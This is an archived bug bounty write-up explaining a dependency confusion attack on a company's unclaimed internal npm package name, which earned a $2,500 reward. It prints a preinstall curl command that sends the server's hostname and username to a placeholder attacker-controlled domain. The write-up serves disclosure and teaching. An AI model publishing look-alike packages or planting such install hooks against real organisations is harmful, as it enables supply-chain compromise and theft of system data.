# [2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node package

- **Source URL:** https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240918030942/https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7302 (id 7302)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# \[2,500$ Bug Bounty Write-Up\] Remote Code Execution (RCE) via unclaimed Node package

## What is Dependency Confusion?

**Dependency Confusion** is a type of software supply chain vulnerability that occurs when a company’s internal package is mistakenly downloaded from a public repository, such as npm, rather than its private registry. This can happen if the package manager (like npm, pip, or others) defaults to pulling from a public source and a package with the same name exists there.

In a dependency confusion attack, an attacker can create a malicious package with the same name as a company’s internal package and publish it to a public registry. If the company’s systems resolve the package from the public registry, they may download and execute the attacker’s code, leading to security risks like Remote Code Execution (RCE).

## How the Vulnerability Was Identified

During an engagement, I examined one of the company’s JavaScript files and noticed that it referenced a Node.js package stored in `/node_modules/@confidential-package-name`. This indicated that the company was using an internal npm package. I checked if this internal package had been published on the public npm registry, and I discovered that it was **unclaimed** on npm.

This unclaimed status indicated that anyone could create a package with the same name and potentially cause a **dependency confusion** issue by tricking the company’s systems into downloading and executing code from the public npm registry instead of their internal source.

## How the Vulnerability Was Exploited

To confirm the risk, I created a malicious npm package using the same name as the internal package `@confidential-package-name`. I then published this package to the public npm registry, embedding a **preinstall** script designed to execute automatically upon installation.

The preinstall script was simple but effective:

curl — data-urlencode “info=$(hostname && whoami)” http://\<attacker-controlled-domain>.oast.fun


This script would send the hostname and user information of the server where the package was installed to a domain under my control. Once the package was live on npm, I’ve waited patiently and within a few hours to days I began receiving multiple requests from both **production** and **non-production environments** of the company, confirming that their systems were downloading and executing the malicious package.

The requests included details like hostnames and usernames, providing valuable insight into which environments were affected by the dependency confusion attack.

## Reporting

After receiving over 150 HTTP and DNS lookups on my controlled host, I began analyzing the IP addresses and the data retrieved from them. I curated the list by filtering out known scrapers and proceeded to conduct WHOIS lookups on all the remaining IPs to check if any matched the company’s IP ranges or their service providers.

Once this analysis was complete, I compiled the report. It was triaged on the same day (big thanks to Raven\_Bugcrowd for the quick triage!), and within a week, the report was accepted. I was awarded a $2,500 bounty — the highest reward available for this specific program.

**BugCrowd: https://bugcrowd.com/Polyxena**

**Linkedin: https://www.linkedin.com/in/fuleki-ioan-503007268/**
